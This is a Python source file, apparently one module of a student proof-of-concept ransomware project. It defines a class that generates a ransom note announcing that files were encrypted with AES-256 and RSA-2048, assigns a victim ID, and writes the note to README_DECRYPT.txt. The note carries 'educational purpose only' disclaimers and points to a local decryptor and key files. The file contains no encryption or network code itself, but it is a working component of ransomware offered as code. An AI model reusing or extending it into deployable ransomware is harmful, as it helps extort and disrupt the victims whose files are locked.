"""
Ransom Note Generator
Fungsi: Generate ransom note (README.txt)
"""

import os
import uuid
from datetime import datetime, timedelta

class RansomNote:
    def __init__(self):
        self.victim_id = str(uuid.uuid4())[:8].upper()
        self.template = """
╔══════════════════════════════════════════════════════════════╗
║                    !!! WARNING !!!                           ║
║                                                              ║
║           YOUR FILES HAVE BEEN ENCRYPTED                     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

[!] EDUCATIONAL PURPOSE ONLY - POC RANSOMWARE [!]

What happened to your files?
─────────────────────────────────────────────────────────────
All your important files have been encrypted with AES-256 
and RSA-2048 encryption algorithms.

Your personal identification:
─────────────────────────────────────────────────────────────
Victim ID: {victim_id}
Encryption Date: {encryption_date}

⚠️ DISCLAIMER ⚠️
─────────────────────────────────────────────────────────────
This is a PROOF OF CONCEPT (POC) ransomware created for 
EDUCATIONAL and RESEARCH purposes ONLY.

This software was developed as part of academic research 
in cybersecurity analysis.

How to decrypt your files:
─────────────────────────────────────────────────────────────
Run the decryptor tool:
    python decryptor.py

You will need:
    1. Private key (keys/private.pem)
    2. Symmetric key (keys/symmetric.key)

DO NOT:
    - Delete encrypted files
    - Delete key files
    - Modify encrypted files

For educational purposes only.
Student: SETANG4
Institution: [Your University]
Date: {current_date}

═══════════════════════════════════════════════════════════════
"""
    
    def generate_note(self, output_dir="."):
        """
        Generate and save ransom note
        """
        current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        encryption_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        note_content = self.template.format(
            victim_id=self.victim_id,
            encryption_date=encryption_date,
            current_date=current_date
        )
        
        note_path = os.path.join(output_dir, "README_DECRYPT.txt")
        
        with open(note_path, "w", encoding="utf-8") as f:
            f.write(note_content)
        
        print(f"[+] Ransom note created: {note_path}")
        return note_path, self.victim_id


# Testing
if __name__ == "__main__":
    rn = RansomNote()
    note_path, victim_id = rn.generate_note("test_data")
    print(f"Victim ID: {victim_id}")
    print(f"Note saved to: {note_path}")